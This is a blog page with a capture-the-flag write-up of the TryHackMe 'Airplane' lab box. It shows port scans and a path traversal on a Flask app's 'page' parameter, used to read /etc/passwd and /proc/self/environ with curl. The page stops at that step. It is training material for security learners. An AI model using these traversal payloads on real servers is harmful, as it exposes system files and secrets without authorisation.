<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=application-name content><meta name=apple-mobile-web-app-status-bar-style content="#fff"><meta name=apple-mobile-web-app-title content><title>Airplane | TryHackMe -
</title><link rel=alternate href=https://h4r1337.github.io/posts/airplane/ hreflang=en><link rel=canonical href=https://h4r1337.github.io/posts/airplane/><link rel=prev href=https://h4r1337.github.io/posts/perfection/><link rel=next href=https://h4r1337.github.io/posts/board-light/><meta name=description content="Airplane is a medium level linux box. In this box you will use a path traversal bug to collect information from `/proc` directory about a gdbserver. We will get initial access into the box as user `hudson` by exploiting the gdb remote debugging server. From there it is a relatively easy privilege escalation by exploiting a suid in `find` command to escalate as user `carlos` and from there into exploiting a wildcard entry in sudoers."><meta name=keywords content="TryHackMe,THM,Writeup,Walkthrough,Airplane,airplane,gdbserver,sudo-l,privilege escalation"><meta property="og:url" content="https://h4r1337.github.io/posts/airplane/"><meta property="og:site_name" content="h4r1337 blog | CTF writeups"><meta property="og:title" content="Airplane | TryHackMe"><meta property="og:description" content="Airplane is a medium level linux box. In this box you will use a path traversal bug to collect information from `/proc` directory about a gdbserver. We will get initial access into the box as user `hudson` by exploiting the gdb remote debugging server. From there it is a relatively easy privilege escalation by exploiting a suid in `find` command to escalate as user `carlos` and from there into exploiting a wildcard entry in sudoers."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-07-29T19:14:03+05:30"><meta property="article:modified_time" content="2024-07-29T19:14:03+05:30"><meta property="article:tag" content="TryHackMe"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Gdbserver"><meta property="article:tag" content="Path-Traversal"><meta property="og:see_also" content="https://h4r1337.github.io/posts/simple-ctf/"><meta property="og:see_also" content="https://h4r1337.github.io/posts/cat-pictures/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Airplane | TryHackMe"><meta name=twitter:description content="Airplane is a medium level linux box. In this box you will use a path traversal bug to collect information from `/proc` directory about a gdbserver. We will get initial access into the box as user `hudson` by exploiting the gdb remote debugging server. From there it is a relatively easy privilege escalation by exploiting a suid in `find` command to escalate as user `carlos` and from there into exploiting a wildcard entry in sudoers."><meta name=referrer content="no-referrer-when-downgrade"><link rel=apple-touch-icon sizes=180x180 href=/favicons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicons/favicon-16x16.png><link rel=manifest href=/favicons/site.webmanifest><link rel=mask-icon href=/favicons/safari-pinned-tab.svg color=#5bbad5><meta name=apple-mobile-web-app-title content="Jekyll Klise"><meta name=application-name content="Jekyll Klise"><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#2c2c2c"><link href=https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css rel=stylesheet><link rel=stylesheet href=/sass/main.min.2480d733c3cd78de5d135eb2d8c0b0f964b2bf1e047d180f4f363bdcc3b23b20.css integrity="sha256-JIDXM8PNeN5dE16y2MCw+WSyvx4EfRgPTzY73MOyOyA="><link rel=stylesheet href=/lib/fontawesome-free/all.min.e5e202e3c899507992952533f57b634722b69b34241d271963559d31aa33ef81.css integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E="></head><body data-theme=dark class=notransition><script>const body=document.body,data=body.getAttribute("data-theme"),initTheme=e=>{e==="dark"?body.setAttribute("data-theme","dark"):e==="light"?body.removeAttribute("data-theme"):localStorage.setItem("theme",data)};initTheme(localStorage.getItem("theme")),setTimeout(()=>body.classList.remove("notransition"),75)</script><script id=partial/analytics.html data-goatcounter=https://h4r1337-blog.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class=navbar role=navigation><nav class=menu><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg width="24" height="24" viewBox="0 0 512 512"><path d="M64 384H448V341.33H64zm0-106.67H448V234.67H64zM64 128v42.67H448V128z"/></svg>
</span></label><a id=mode href=#><svg class="mode-sunny" width="24" height="24" viewBox="0 0 512 512"><title>LIGHT</title><line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/></svg><svg class="mode-moon" width="24" height="24" viewBox="0 0 512 512"><title>DARK</title><line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/></svg></a><div class=trigger><div class=trigger-container><a class=menu-link href=/ title=home>home
</a><a class=menu-link href=/posts title=posts>posts
</a><a class=menu-link href=/series title=series>series
</a><a class=menu-link href=/resume.pdf title=resume>resume
</a><a class=menu-link href=/whoami title=whoami>whoami
</a><a class="menu-link rss" href=/index.xml><svg width="17" height="17" viewBox="0 0 512 512" fill="#ed812e"><title>RSS</title><path d="M108.56 342.78a60.34 60.34.0 1060.56 60.44 60.63 60.63.0 00-60.56-60.44z"/><path d="M48 186.67v86.55c52 0 101.94 15.39 138.67 52.11s52 86.56 52 138.67h86.66c0-151.56-125.66-277.33-277.33-277.33z"/><path d="M48 48v86.56c185.25.0 329.22 144.08 329.22 329.44H464C464 234.66 277.67 48 48 48z"/></svg></a></div></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article itemscope itemtype=https://schema.org/BlogPosting><header class=header><div class=tags><span itemprop=keywords><a href=https://h4r1337.github.io/tags/tryhackme/ class=tag>TRYHACKME</a>
,
<a href=https://h4r1337.github.io/tags/linux/ class=tag>LINUX</a>
,
<a href=https://h4r1337.github.io/tags/ctf/ class=tag>CTF</a>
,
<a href=https://h4r1337.github.io/tags/medium/ class=tag>MEDIUM</a>
,
<a href=https://h4r1337.github.io/tags/gdbserver/ class=tag>GDBSERVER</a>
,
<a href=https://h4r1337.github.io/tags/path-traversal/ class=tag>PATH-TRAVERSAL</a>
,
<a href=https://h4r1337.github.io/tags/proc/ class=tag>/PROC</a>
,
<a href=https://h4r1337.github.io/tags/find/ class=tag>FIND</a>
,
<a href=https://h4r1337.github.io/tags/sudo-l/ class=tag>SUDO-L</a></span></div><h1 class=header-title itemprop=headline>Airplane | TryHackMe</h1><div class=post-meta><time datetime="2024-07-29 19:14:03 +0530 +0530" itemprop=datePublished>2024-07-29
</time><span itemprop=author itemscope itemtype=https://schema.org/Person><span itemprop=name>h4r1337</span>
</span><time hidden datetime="2024-07-29 19:14:03 +0530 +0530" itemprop=dateModified></time>
<span hidden itemprop=publisher itemtype=Person>h4r1337</span>
<span hidden itemprop=mainEntityOfPage>Airplane is a medium level linux box. In this box you will use a path traversal bug to collect information from `/proc` directory about a gdbserver. We will get initial access into the box as user `hudson` by exploiting the gdb remote debugging server. From there it is a relatively easy privilege escalation by exploiting a suid in `find` command to escalate as user `carlos` and from there into exploiting a wildcard entry in sudoers.</span></div></header><div class=page-content itemprop=articleBody><div class="alert alert-tip collapsed"><div class=alert-heading-box onclick=toggleAlert(this)><i class="bx bx-bulb"></i><p class=alert-heading>About Airplane</p><i class='bx bx-chevron-down collapsed'></i></div><div class=alert-content style=display:none><p>Airplane is a medium level linux box. In this box you will use a path traversal bug to collect information from <code>/proc</code> directory about a gdbserver. We will get initial access into the box as user <code>hudson</code> by exploiting the gdb remote debugging server. From there it is a relatively easy privilege escalation by exploiting a suid in <code>find</code> command to escalate as user <code>carlos</code> and from there into exploiting a wildcard entry in sudoers.</p></div></div><script>function toggleAlert(e){var t=e.parentElement,s=t.querySelector(".alert-content"),n=e.querySelectorAll("i")[1];t.classList.toggle("open"),t.classList.toggle("collapsed"),t.classList.contains("open")?(s.style.display="block",n.classList.remove("open"),n.classList.add("collapsed")):(n.classList.remove("collapsed"),n.classList.add("open"),s.style.display="none")}</script><h2 id=information-gathering><a href=#information-gathering class=anchor-head aria-label=Anchor></a>Information Gathering</h2><p>Scanned all TCP ports:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rustscan -a 10.10.121.174
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
</span></span><span style=display:flex><span>| <span style=color:#fe8019>{}</span>  <span style=color:#fe8019>}</span>| <span style=color:#fe8019>{</span> <span style=color:#fe8019>}</span> |<span style=color:#fe8019>{</span> <span style=color:#fe8019>{</span>__ <span style=color:#fe8019>{</span>_   _<span style=color:#fe8019>}{</span> <span style=color:#fe8019>{</span>__  /  ___<span style=color:#fe8019>}</span> / <span style=color:#fe8019>{}</span> <span style=color:#b8bb26>\ </span>|  <span style=color:#b8bb26>`</span>| |
</span></span><span style=display:flex><span>| .-. <span style=color:#b8bb26>\|</span> <span style=color:#fe8019>{</span>_<span style=color:#fe8019>}</span> |.-._<span style=color:#fe8019>}</span> <span style=color:#fe8019>}</span> | |  .-._<span style=color:#fe8019>}</span> <span style=color:#fe8019>}</span><span style=color:#b8bb26>\ </span>    <span style=color:#fe8019>}</span>/  /<span style=color:#b8bb26>\ </span> <span style=color:#b8bb26>\|</span> |<span style=color:#b8bb26>\ </span> |
</span></span><span style=display:flex><span><span style=color:#b8bb26>`</span>-<span style=color:#b8bb26>&#39; `-&#39;</span><span style=color:#b8bb26>`</span>-----<span style=color:#b8bb26>&#39;`----&#39;</span>  <span style=color:#b8bb26>`</span>-<span style=color:#b8bb26>&#39;  `----&#39;</span>  <span style=color:#b8bb26>`</span>---<span style=color:#b8bb26>&#39; `-&#39;</span>  <span style=color:#b8bb26>`</span>-<span style=color:#b8bb26>&#39;`-&#39;</span> <span style=color:#b8bb26>`</span>-&#39;
</span></span><span style=display:flex><span>The Modern Day Port Scanner.
</span></span><span style=display:flex><span>________________________________________
</span></span><span style=display:flex><span>: http://discord.skerritt.blog         :
</span></span><span style=display:flex><span>: https://github.com/RustScan/RustScan :
</span></span><span style=display:flex><span> --------------------------------------
</span></span><span style=display:flex><span>ðŸ˜µ https://admin.tryhackme.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Open 10.10.121.174:22
</span></span><span style=display:flex><span>Open 10.10.121.174:6048
</span></span><span style=display:flex><span>Open 10.10.121.174:8000
</span></span></code></pre></div><p>Enumerated open TCP ports:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -p22,8000,6048 -sC -sV --min-rate<span style=color:#fe8019>=</span><span style=color:#d3869b>10000</span> 10.10.121.174 -oA nmap/services
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#928374;font-style:italic>## Nmap 7.80 scan initiated Mon Jul 29 17:10:23 2024 as: nmap -p22,8000,6048 -sC -sV -vv --min-rate 10000 -oA nmap/services 10.10.121.174</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#fe8019>for</span> airplane.thm <span style=color:#fe8019>(</span>10.10.121.174<span style=color:#fe8019>)</span>
</span></span><span style=display:flex><span>Host is up, received conn-refused <span style=color:#fe8019>(</span>0.46s latency<span style=color:#fe8019>)</span>.
</span></span><span style=display:flex><span>Scanned at 2024-07-29 17:10:23 IST <span style=color:#fe8019>for</span> 195s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE  REASON  VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#fe8019>(</span>Ubuntu Linux; protocol 2.0<span style=color:#fe8019>)</span>
</span></span><span style=display:flex><span>6048/tcp open  x11?     syn-ack
</span></span><span style=display:flex><span>8000/tcp open  http-alt syn-ack Werkzeug/3.0.2 Python/3.8.10
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   FourOhFourRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d3869b>404</span> NOT FOUND
</span></span><span style=display:flex><span>|     Server: Werkzeug/3.0.2 Python/3.8.10
</span></span><span style=display:flex><span>|     Date: Mon, <span style=color:#d3869b>29</span> Jul <span style=color:#d3869b>2024</span> 11:40:38 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#fe8019>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d3869b>207</span>
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!doctype html&gt;
</span></span><span style=display:flex><span>|     &lt;html lang<span style=color:#fe8019>=</span>en&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d3869b>302</span> FOUND
</span></span><span style=display:flex><span>|     Server: Werkzeug/3.0.2 Python/3.8.10
</span></span><span style=display:flex><span>|     Date: Mon, <span style=color:#d3869b>29</span> Jul <span style=color:#d3869b>2024</span> 11:40:32 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#fe8019>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d3869b>269</span>
</span></span><span style=display:flex><span>|     Location: http://airplane.thm:8000/?page<span style=color:#fe8019>=</span>index.html
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!doctype html&gt;
</span></span><span style=display:flex><span>|     &lt;html lang<span style=color:#fe8019>=</span>en&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;http://airplane.thm:8000/?page=index.html&#34;</span>&gt;http://airplane.thm:8000/?page<span style=color:#fe8019>=</span>index.html&lt;/a&gt;. If not, click the link.
</span></span><span style=display:flex><span>|   Socks5: 
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML PUBLIC <span style=color:#b8bb26>&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
</span></span><span style=display:flex><span>|     <span style=color:#b8bb26>&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;html&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta http-equiv<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;Content-Type&#34;</span> content<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;text/html;charset=utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;/head&gt;
</span></span><span style=display:flex><span>|     &lt;body&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Message: Bad request syntax <span style=color:#fe8019>(</span><span style=color:#b8bb26>&#39;
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>|     &#39;</span><span style=color:#fe8019>)</span>.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;/body&gt;
</span></span><span style=display:flex><span>|_    &lt;/html&gt;
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: HEAD GET OPTIONS
</span></span><span style=display:flex><span>|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
</span></span><span style=display:flex><span>| http-title: About Airplanes
</span></span><span style=display:flex><span>|_Requested resource was http://airplane.thm:8000/?page<span style=color:#fe8019>=</span>index.html
</span></span><span style=display:flex><span><span style=color:#d3869b>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port8000-TCP:V<span style=color:#fe8019>=</span>7.80%I<span style=color:#fe8019>=</span>7%D<span style=color:#fe8019>=</span>7/29%Time<span style=color:#fe8019>=</span>66A77FB0%P<span style=color:#fe8019>=</span>x86_64-pc-linux-gnu%r<span style=color:#fe8019>(</span>Ge
</span></span><span style=display:flex><span>SF:tRequest,1F3,<span style=color:#b8bb26>&#34;HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:x20Python/3\.8\.10\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2011:40:32\x2
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.html\r\
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\n&lt;ti
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:tle&gt;Redirecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x20sh
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:ould\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF::\x20&lt;a\x20href=\&#34;http://airplane\.thm:8000/\?page=index\.html\&#34;&gt;http:/
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:/airplane\.thm:8000/\?page=index\.html&lt;/a&gt;\.\x20If\x20not,\x20click\x20
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:the\x20link\.\n&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>FourOhFourRequest,184,<span style=color:#b8bb26>&#34;HTTP/1\.1\x20404\x20NOT\x20F
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:OUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20Mon,
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\x2029\x20Jul\x202024\x2011:40:38\x20GMT\r\nContent-Type:\x20text/html;
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20UR
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:L\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20a
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:gain\.&lt;/p&gt;\n&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>Socks5,213,<span style=color:#b8bb26>&#34;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3C//D
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:TD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\&#34;http://www
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20con
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:tent=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;tit
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:le&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x2
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:0\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#39;\\x05
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:0\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_RE
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:QUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.
</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style=color:#fe8019>)</span>;
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Nmap done at Mon Jul 29 17:13:38 2024 -- 1 IP address (1 host up) scanned in 195.14 seconds</span>
</span></span></code></pre></div><hr><h2 id=enumeration><a href=#enumeration class=anchor-head aria-label=Anchor></a>Enumeration</h2><h3 id=port-8000---http-flask-302><a href=#port-8000---http-flask-302 class=anchor-head aria-label=Anchor></a>Port 8000 - HTTP (Flask 3.0.2)</h3><p>Going to port 8000 redirect us to <code>airplane.thm:8000/?page=index.html</code>
Let&rsquo;s add <code>airplane.thm</code> to <code>/etd/hosts</code>:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#fabd2f>echo</span> -e <span style=color:#b8bb26>&#39;10.10.121.174\tairplane.thm&#39;</span> | sudo tee -a /etc/hosts
</span></span></code></pre></div><figure><img src=/img/airplane/Pasted%20image%2020240729170637.webp></figure><hr><h2 id=exploitation><a href=#exploitation class=anchor-head aria-label=Anchor></a>Exploitation</h2><h3 id=path-traversal><a href=#path-traversal class=anchor-head aria-label=Anchor></a>Path traversal</h3><p>After seeing the <code>page</code> parameter I first tried path traversal.</p><figure><img src=/img/airplane/Pasted%20image%2020240729171235.webp></figure><p>It worked. I am using <a href=https://httpie.io/>httpie</a> btw.</p><p>Since the website is running on flask I tried if we can access <code>/console</code>. Often if we have
access to the debug console we can use path traversal to get some system information for
generating the console pin and getting a remote shell.
You can check <a href=https://www.daehee.com/blog/werkzeug-console-pin-exploit>this article</a> to find more about this attack.</p><figure><img src=/img/airplane/Pasted%20image%2020240729171659.webp></figure><p>But as you can see the debug mode is not enabled.</p><p>Next I tried to retrieve ssh keys if there&rsquo;s any. From the <code>/etc/passwd</code> file we can see that there are 3 users: <code>root</code>, <code>carlos</code>, and <code>hudson</code></p><figure><img src=/img/airplane/Pasted%20image%2020240729172000.webp></figure><p>It does not exists or the current user can&rsquo;t access it maybe because we are <code>www-data</code> or something. In linux if we have a path traversal we can use some files in the <code>/proc</code> directory to retrieve valuable informations about the machine.
Check <a href=https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#the-proc-file-system>this article</a> for more info about this attack vector. Here are some of the locations that you can check:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#fe8019>/</span>proc<span style=color:#fe8019>/</span>version      <span style=color:#fe8019>-</span> Kernel version
</span></span><span style=display:flex><span><span style=color:#fe8019>/</span>proc<span style=color:#fe8019>/</span>self<span style=color:#fe8019>/</span>environ <span style=color:#fe8019>-</span> <span style=color:#fb4934>Environment</span> variables of the current process
</span></span><span style=display:flex><span><span style=color:#fe8019>/</span>proc<span style=color:#fe8019>/</span>self<span style=color:#fe8019>/</span>cmdline <span style=color:#fe8019>-</span> Process invocation command with parameters
</span></span><span style=display:flex><span><span style=color:#fe8019>/</span>proc<span style=color:#fe8019>/</span>self<span style=color:#fe8019>/</span>cwd<span style=color:#fe8019>/</span>    <span style=color:#fe8019>-</span> Points to the current working directory
</span></span><span style=display:flex><span><span style=color:#fe8019>/</span>proc<span style=color:#fe8019>/</span>sched_debug  <span style=color:#fe8019>-</span> Scheduling information <span style=color:#fe8019>and</span> running processes per CPU
</span></span></code></pre></div><figure><img src=/img/airplane/Pasted%20image%2020240729174648.webp></figure><p>Unfortunately <code>http</code> does not output binary data. Note that the content of the <code>/proc/self/environ</code> is marked as binary data because it is using null bytes as a seperator instead
of using new line (<code>\n</code>) or space.
So back to <code>curl</code> again&mldr;</p><figure><img src=/img/airplane/Pasted%20image%2020240729175501.webp></figure><p>To fix the output we can easily pipe that into sed and replace the null bytes to new line characters to get a clean output.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl --path-as-is <span style=color:#b8bb26>&#39;10.10.121.174:8000/?page=../../../../../../proc/self/environ&#39;</span> --silent --output - | sed -e <span style=color:#b8bb26>&#39;s/\x0/\n/g&#39;</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## When dealing with stdin we use -e or --expression instead of -i</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## The format is like `s/find/replace/g`</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## s   -&gt; search</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## \x0 -&gt; null byte</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## \n  -&gt; new line</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## g   -&gt; means global, all occurances will be replaced</span>
